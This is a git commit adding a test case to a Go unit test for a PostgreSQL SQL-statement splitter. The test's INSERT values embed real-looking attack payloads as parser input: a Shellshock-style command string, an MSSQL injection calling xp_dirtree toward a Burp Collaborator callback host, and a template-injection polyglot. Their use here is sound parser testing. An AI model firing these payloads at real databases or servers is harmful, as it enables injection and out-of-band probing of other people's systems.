727b95362a0a736358e6a09d3238c5777982d4a5
rebelice <yangrebelice@gmail.com>
2022-08-24 15:34:21 +0800

    test: add a complex test case

--- plugin/parser/split_multi_sql_test.go
+++ plugin/parser/split_multi_sql_test.go
@@ -148,6 +148,25 @@ func TestPGSplitMultiSQL(t *testing.T) {
 			},
 		},
 		{
+			statement: `INSERT INTO "public"."test"("id","text")
+			VALUES
+			(204268,E'calculate: exchange ,fee_id :3731: currency exchange rate not found () { :;}; /bin/sleep 0'),
+			(204169,E'calculate: exchange ,fee_id :3247: currency exchange rate not found HKD\';declare @q varchar(99);set @q=\'\\\\cl1gtatvghwnx5lmnbsunjgdw42zqttvhm8a0xyln.burpcollab\'+\'orator.net\\xsa\'; exec master.dbo.xp_dirtree @q;-- '),
+			(204159,E'calculate: exchange ,fee_id :3823: currency exchange rate not found a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\');`,
+			want: resData{
+				res: []SingleSQL{
+					{
+						Text: `INSERT INTO "public"."test"("id","text")
+			VALUES
+			(204268,E'calculate: exchange ,fee_id :3731: currency exchange rate not found () { :;}; /bin/sleep 0'),
+			(204169,E'calculate: exchange ,fee_id :3247: currency exchange rate not found HKD\';declare @q varchar(99);set @q=\'\\\\cl1gtatvghwnx5lmnbsunjgdw42zqttvhm8a0xyln.burpcollab\'+\'orator.net\\xsa\'; exec master.dbo.xp_dirtree @q;-- '),
+			(204159,E'calculate: exchange ,fee_id :3823: currency exchange rate not found a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\');`,
+						Line: 1,
+					},
+				},
+			},
+		},
+		{
 			statement: `INSERT INTO t VALUES ('klajfas)`,
 			want: resData{
 				err: "invalid string: not found delimiter: ', but found EOF",
